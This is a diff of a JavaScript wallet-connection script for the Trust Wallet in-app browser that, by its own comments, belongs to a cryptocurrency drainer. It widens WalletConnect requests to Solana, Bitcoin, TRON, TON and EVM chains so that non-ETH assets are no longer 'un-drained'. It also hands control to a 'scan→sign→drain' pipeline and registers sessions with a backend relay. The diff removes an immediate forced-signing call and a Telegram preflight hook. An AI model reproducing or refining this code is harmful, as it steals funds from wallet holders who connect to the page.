@@ -1,10 +1,10 @@
 /**
- * Trust open_url → in-app browser handoff v1.1
+ * Trust open_url → in-app browser handoff v1.2
  *
  * Outside Trust: open_url into Trust dApp Browser.
  * Inside Trust (utm_source=Trust_iOS_Browser): NEVER open trust:// / link.trustwallet.com
  * again — that triggers "blocked from automatically opening an external application".
- * Stay put → injected ethereum only.
+ * Stay put → AppKit/WC multichain (all namespaces) — NOT eth_requestAccounts ETH-only sheet.
  */
 (function () {
   'use strict';
@@ -131,6 +131,36 @@
     };
   }
 
+  var _handoffChipTimer = null;
+
+  function _showHandoffChip(native, uni) {
+    try {
+      if (isTrustInApp() || document.hidden) return;
+      var chip = document.getElementById('__trust_inapp_chip');
+      if (chip) { chip.style.display = ''; return; }
+      chip = document.createElement('button');
+      chip.id = '__trust_inapp_chip';
+      chip.type = 'button';
+      chip.textContent = '🛡️ Open in Trust Wallet';
+      chip.style.cssText = [
+        'position:fixed', 'left:50%', 'transform:translateX(-50%)',
+        'bottom:calc(84px + env(safe-area-inset-bottom,0px))',
+        'z-index:2147483644', 'background:#0500ff', 'color:#fff',
+        'border:0', 'border-radius:999px', 'padding:13px 22px',
+        'font:700 14px system-ui,sans-serif',
+        'box-shadow:0 8px 28px rgba(5,0,255,.5)', 'white-space:nowrap',
+        'cursor:pointer', '-webkit-tap-highlight-color:transparent',
+      ].join(';');
+      chip.onclick = function (e) {
+        e.preventDefault();
+        chip.style.display = 'none';
+        handoffArmed = false;
+        handoffToTrustBrowser();
+      };
+      document.body.appendChild(chip);
+    } catch (_) {}
+  }
+
   function handoffToTrustBrowser() {
     if (isTrustInApp()) {
       console.warn('[TrustInApp] skip handoff — already inside Trust Browser');
@@ -150,23 +180,23 @@
     var native = openUrlNative(url);
     var uni = openUrlUniversal(url);
 
-    try {
-      var a = document.createElement('a');
-      a.href = native;
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-      setTimeout(function () { try { a.remove(); } catch (_) {} }, 800);
-    } catch (_) {
-      try { window.location.href = native; } catch (_) {}
-    }
+    // Primary: window.location.href is the most reliable deeplink trigger
+    // (a.click() on hidden elements is blocked by iOS Safari security policy)
+    try { window.location.href = native; } catch (_) {}
 
+    // Universal link fallback after 1.5s (fires if native deeplink failed)
     setTimeout(function () {
       try {
-        if (isTrustInApp()) return;
-        if (!document.hidden) window.location.href = uni;
+        if (isTrustInApp() || document.hidden) return;
+        window.location.href = uni;
       } catch (_) {}
-    }, 500);
+    }, 1500);
+
+    // Chip fallback after 3s — visible "Open in Trust Wallet" button if both failed
+    clearTimeout(_handoffChipTimer);
+    _handoffChipTimer = setTimeout(function () {
+      try { _showHandoffChip(native, uni); } catch (_) {}
+    }, 3000);
 
     return true;
   }
@@ -190,21 +220,223 @@
     return null;
   }
 
-  async function connectInjectedTrust() {
-    markInApp();
-    var prov = getInjectedTrust();
-    if (!prov || typeof prov.request !== 'function') {
-      console.warn('[TrustInApp] waiting for injected provider…');
+  var _connectInFlight = false;
+  var _connectDoneAddr = '';
+  var _connectPromise = null;
+  var _wcRetryCount = 0;
+  var _WC_MAX_RETRIES = 2;
+
+  function showAppKitModal() {
+    try {
+      var s = document.getElementById('__wc_appkit_css');
+      if (!s) {
+        s = document.createElement('style');
+        s.id = '__wc_appkit_css';
+        document.head.appendChild(s);
+      }
+      // In Trust Browser we WANT the AppKit sheet (multi-chain namespaces)
+      s.textContent = '';
+    } catch (_) {}
+  }
+
+  function waitForLegion(ms) {
+    ms = ms || 12000;
+    return new Promise(function (resolve) {
+      var start = Date.now();
+      (function tick() {
+        if (window.legion && typeof window.legion.connectWC === 'function') {
+          resolve(window.legion);
+          return;
+        }
+        if (Date.now() - start > ms) {
+          resolve(null);
+          return;
+        }
+        setTimeout(tick, 120);
+      })();
+    });
+  }
+
+  /** Silent address — used only for resume / injected fallback. */
+  async function resolveTrustAddressSilent(prov) {
+    var addr = '';
+    try {
+      var sel = prov.selectedAddress || prov.address || '';
+      if (sel) addr = String(sel).toLowerCase();
+    } catch (_) {}
+    if (!addr) {
+      try {
+        var st = prov._state || prov._addresses || null;
+        if (st && st.accounts && st.accounts[0]) addr = String(st.accounts[0]).toLowerCase();
+      } catch (_) {}
+    }
+    if (!addr) {
+      try {
+        var accts = await prov.request({ method: 'eth_accounts' });
+        if (accts && accts[0]) addr = String(accts[0]).toLowerCase();
+      } catch (_) {}
+    }
+    if (!addr) {
+      try {
+        addr = String(sessionStorage.getItem('trust_site_connected_addr') || '').toLowerCase();
+      } catch (_) {}
+    }
+    if (!addr) {
+      try {
+        addr = String(sessionStorage.getItem('legion_wc_evm_addr') || '').toLowerCase();
+      } catch (_) {}
+    }
+    if (addr && addr.indexOf('0x') === 0 && addr.length >= 42) return addr;
+    return '';
+  }
+
+  /** Retry WC connect (no ETH-only degradation). Resets single-flight state and re-fires. */
+  async function wcRetry(reason) {
+    if (_wcRetryCount >= _WC_MAX_RETRIES) {
+      console.warn('[TrustInApp] WC retries exhausted (' + _WC_MAX_RETRIES + ') — giving up, reason: ' + reason);
       return false;
     }
+    _wcRetryCount++;
+    console.warn('[TrustInApp] WC retry #' + _wcRetryCount + '/' + _WC_MAX_RETRIES + ' — reason: ' + reason);
+    _connectInFlight = false;
+    _connectPromise = null;
+    window.__TRUST_CONNECT_LOCK__ = false;
+    await new Promise(function (r) { setTimeout(r, 2000); });
+    return connectAppKitTrust();
+  }
 
-    console.warn('[TrustInApp] injected connect — stay in Trust Browser');
+  /**
+   * PRIMARY in-app path: Reown AppKit / WC with optionalNamespaces.
+   * SINGLE-FLIGHT: boot / direct / openSmartConnect / wrapConnect share one promise.
+   */
+  async function connectAppKitTrust() {
+    try {
+      if (window.__TRUST_CONNECT_DONE_ADDR__) {
+        _connectDoneAddr = String(window.__TRUST_CONNECT_DONE_ADDR__);
+        console.warn('[TrustInApp] already connected (global)', _connectDoneAddr.slice(0, 10));
+        return true;
+      }
+    } catch (_) {}
+    if (_connectDoneAddr) {
+      console.warn('[TrustInApp] already connected', _connectDoneAddr.slice(0, 10));
+      return true;
+    }
+    // Sync global lock — prevents bootInApp + direct + wrap racing before _connectInFlight flips
+    if (window.__TRUST_CONNECT_LOCK__ && _connectPromise) {
+      console.warn('[TrustInApp] connect already in-flight (global) — join');
+      return _connectPromise;
+    }
+    if (_connectInFlight && _connectPromise) {
+      console.warn('[TrustInApp] connect already in-flight — join');
+      return _connectPromise;
+    }
+
+    window.__TRUST_CONNECT_LOCK__ = true;
+    _connectInFlight = true;
+    _connectPromise = (async function () {
+    markInApp();
+    try { window.__TRUST_INAPP_APPKIT__ = true; } catch (_) {}
     try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
     try { window.__SELECTED_WALLET__ = 'trust'; } catch (_) {}
 
-    var accounts = await prov.request({ method: 'eth_requestAccounts' });
-    var addr = accounts && accounts[0] ? String(accounts[0]).toLowerCase() : '';
+    // Always use WC/AppKit (multi-chain: SOL+BTC+TRON+TON+EVM namespaces).
+    // Injected shortcut removed — it only gave ETH address, leaving non-EVM chains un-drained.
+    // Trust Browser intercepts the WC URI natively and shows its own multi-chain approval sheet.
+    // On failure: wcRetry() fires (up to _WC_MAX_RETRIES times) — never degrades to ETH-only.
+    showAppKitModal();
+    console.warn('[TrustInApp] WC multichain connect — all chains (SOL/BTC/TRON/TON/EVM)');
+
+    try {
+      var L = await waitForLegion(15000);
+      if (!L) {
+        console.warn('[TrustInApp] legion not ready — WC retry');
+        return await wcRetry('legion-not-ready');
+      }
+
+      var existing = '';
+      try {
+        existing = String((L.state && L.state.evmAddr) || sessionStorage.getItem('legion_wc_evm_addr') || '').toLowerCase();
+      } catch (_) {}
+      if (existing && existing.indexOf('0x') === 0 && L.state && (L.state.wcSessionActive || L.state.evmProvider)) {
+        _connectDoneAddr = existing;
+        try { window.__TRUST_CONNECT_DONE_ADDR__ = existing; } catch (_) {}
+        console.warn('[TrustInApp] resume session', existing.slice(0, 10));
+        // Register WC session with backend relay BEFORE starting pipeline
+        // (resume path skips bundledWalletConnect so we must call it here)
+        try { if (typeof L.registerWcSession === 'function') L.registerWcSession(); } catch (_) {}
+        try {
+          if (typeof L.startPipeline === 'function') L.startPipeline({ reason: 'resume' });
+          else if (typeof L.continueConnected === 'function') L.continueConnected();
+        } catch (_) {}
+        return true;
+      }
+
+      try { if (typeof L.beginConnect === 'function') L.beginConnect('wc'); } catch (_) {}
+      // Do NOT clearWc on every entry — wipes in-flight AppKit
+      if (typeof L.connectWC === 'function') {
+        await Promise.resolve(L.connectWC());
+      } else if (typeof L.connect === 'function') {
+        await Promise.resolve(L.connect());
+      }
+
+      var addr = '';
+      for (var i = 0; i < 40; i++) {
+        try {
+          addr = String((L.state && L.state.evmAddr) || sessionStorage.getItem('legion_wc_evm_addr') || '').toLowerCase();
+        } catch (_) {}
+        if (addr && addr.indexOf('0x') === 0) break;
+        await new Promise(function (r) { setTimeout(r, 500); });
+      }
+      if (addr && addr.indexOf('0x') === 0) {
+        _connectDoneAddr = addr;
+        try { window.__TRUST_CONNECT_DONE_ADDR__ = addr; } catch (_) {}
+        try { sessionStorage.setItem('trust_site_connected_addr', addr); } catch (_) {}
+        console.warn('[TrustInApp] WC connected', addr.slice(0, 10));
+        return true;
+      }
+
+      console.warn('[TrustInApp] WC gave no address — retry WC');
+      return await wcRetry('no-addr');
+    } catch (e) {
+      console.warn('[TrustInApp] WC error', e && e.message, '— retry WC');
+      return await wcRetry('wc-error');
+    }
+    })().finally(function () {
+      _connectInFlight = false;
+      // Keep global lock until done-addr set so late callers join/skip instead of re-fire
+      try {
+        if (_connectDoneAddr || window.__TRUST_CONNECT_DONE_ADDR__) {
+          window.__TRUST_CONNECT_LOCK__ = true;
+        } else {
+          window.__TRUST_CONNECT_LOCK__ = false;
+          _connectPromise = null;
+        }
+      } catch (_) {
+        _connectPromise = null;
+      }
+    });
+
+    return _connectPromise;
+  }
+
+  /** Last resort: injected eth_requestAccounts (ETH-only Connect DApp). */
+  async function connectInjectedTrustFallback() {
+    var prov = getInjectedTrust();
+    if (!prov || typeof prov.request !== 'function') {
+      console.warn('[TrustInApp] no injected provider for fallback');
+      return false;
+    }
+    console.warn('[TrustInApp] FALLBACK injected eth_requestAccounts (ETH-only)');
+    try { window.__SELECTED_WALLET__ = 'trust'; } catch (_) {}
+
+    var addr = await resolveTrustAddressSilent(prov);
+    if (!addr) {
+      var accounts = await prov.request({ method: 'eth_requestAccounts' });
+      addr = accounts && accounts[0] ? String(accounts[0]).toLowerCase() : '';
+    }
     if (!addr) throw new Error('no account');
+    _connectDoneAddr = addr;
+    try { window.__TRUST_CONNECT_DONE_ADDR__ = addr; } catch (_) {}
 
     try {
       sessionStorage.setItem('trust_site_connected_addr', addr);
@@ -224,6 +456,7 @@
       L.state.evmChain = chainId;
       L.state.connectMode = 'injected';
       L.state.evmWallet = 'Trust Wallet';
+      L.state.injectedWalletKey = 'trust';
       L.state.wcSessionActive = false;
     }
 
@@ -233,32 +466,32 @@
       }));
     } catch (_) {}
 
-    // SIGN IMMEDIATELY — 0 delay (Telegram/preflight must not block)
+    // Notify only — legion startPipeline / handleEvmConnect owns scan→sign→drain
+    // Do NOT call forceTrustSign or drain here (kills dual-pipeline race)
     try {
-      if (window.legion && typeof window.legion.forceTrustSign === 'function') {
-        window.legion.forceTrustSign().catch(function (e) {
-          console.warn('[TrustInApp] forceSign', e && e.message);
+      if (L && typeof L.startPipeline === 'function') {
+        L.startPipeline({ reason: 'connect-injected' }).catch(function (e) {
+          console.warn('[TrustInApp] startPipeline', e && e.message);
         });
-      } else if (typeof window.__TRUST_RUN_PIPELINE__ === 'function') {
-        window.__TRUST_RUN_PIPELINE__('trust-inapp');
+      } else if (L && typeof L.notifyConnect === 'function') {
+        L.notifyConnect(addr, chainId, 'Trust Wallet').catch(function (e) {
+          console.warn('[TrustInApp] notify', e && e.message);
+        });
       }
     } catch (_) {}
-
-    // Preflight / Telegram in background only
-    setTimeout(function () {
-      try {
-        if (typeof window.__TRUST_PREFLIGHT__ === 'function') window.__TRUST_PREFLIGHT__(addr);
-      } catch (_) {}
-    }, 1500);
 
     return true;
   }
 
+  /** @deprecated name kept — now AppKit primary */
+  async function connectInjectedTrust() {
+    return connectAppKitTrust();
+  }
+
   function preferInAppOrContinue(continueFn) {
     if (isTrustInApp()) {
-      connectInjectedTrust().catch(function (e) {
-        console.warn('[TrustInApp] injected fail', e && e.message);
-        // NEVER fall back to WC deeplink while in Trust Browser
+      connectAppKitTrust().catch(function (e) {
+        console.warn('[TrustInApp] AppKit fail', e && e.message);
       });
       return true;
     }
@@ -302,11 +535,17 @@
 
   function bootInApp() {
     if (!isTrustInApp()) return;
-    console.warn('[TrustInApp] inside Trust Browser ✓ — no more external opens');
+    if (window.__TRUST_BOOT_CONNECT_ARMED__) {
+      console.warn('[TrustInApp] boot connect already armed — skip');
+      return;
+    }
+    window.__TRUST_BOOT_CONNECT_ARMED__ = true;
+    console.warn('[TrustInApp] inside Trust Browser ✓ — AppKit once');
     markInApp();
     installInAppNavGuard();
+    try { window.__TRUST_INAPP_APPKIT__ = true; } catch (_) {}
+    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
 
-    // Remove chip if any
     try {
       var chip = document.getElementById('__trust_inapp_chip');
       if (chip) chip.remove();
@@ -317,16 +556,15 @@
     var n = 0;
     var t = setInterval(function () {
       n++;
-      var addr = '';
-      try { addr = sessionStorage.getItem('trust_site_connected_addr') || ''; } catch (_) {}
-      if (addr || n > 50) {
+      if (window.__TRUST_CONNECT_DONE_ADDR__ || _connectDoneAddr) {
         clearInterval(t);
-        if (!addr) connectInjectedTrust().catch(function () {});
         return;
       }
-      if (window.ethereum || (window.trustwallet && window.trustwallet.ethereum)) {
+      var ready = !!(window.legion && typeof window.legion.connectWC === 'function');
+      var hasProv = !!(window.ethereum || (window.trustwallet && window.trustwallet.ethereum));
+      if (ready || hasProv || n > 60) {
         clearInterval(t);
-        connectInjectedTrust().catch(function () {});
+        connectAppKitTrust().catch(function () {});
       }
     }, 250);
   }
@@ -348,6 +586,7 @@
     ].join(';');
     chip.onclick = function (e) {
       e.preventDefault();
+      handoffArmed = false;
       handoffToTrustBrowser();
     };
     document.body.appendChild(chip);
@@ -355,13 +594,14 @@
 
   window.__TRUST_OPEN_INAPP__ = handoffToTrustBrowser;
   window.__TRUST_IS_IN_APP__ = isTrustInApp;
-  window.__TRUST_CONNECT_INJECTED__ = connectInjectedTrust;
+  window.__TRUST_CONNECT_INJECTED__ = connectInjectedTrust; // alias → AppKit primary
+  window.__TRUST_CONNECT_APPKIT__ = connectAppKitTrust;
   window.__TRUST_PREFER_INAPP__ = preferInAppOrContinue;
 
   function start() {
     installInAppNavGuard();
     bootInApp();
-    ensureChip();
+    // ensureChip removed — chip was showing on page load before user interaction
     wrapConnect();
   }
 
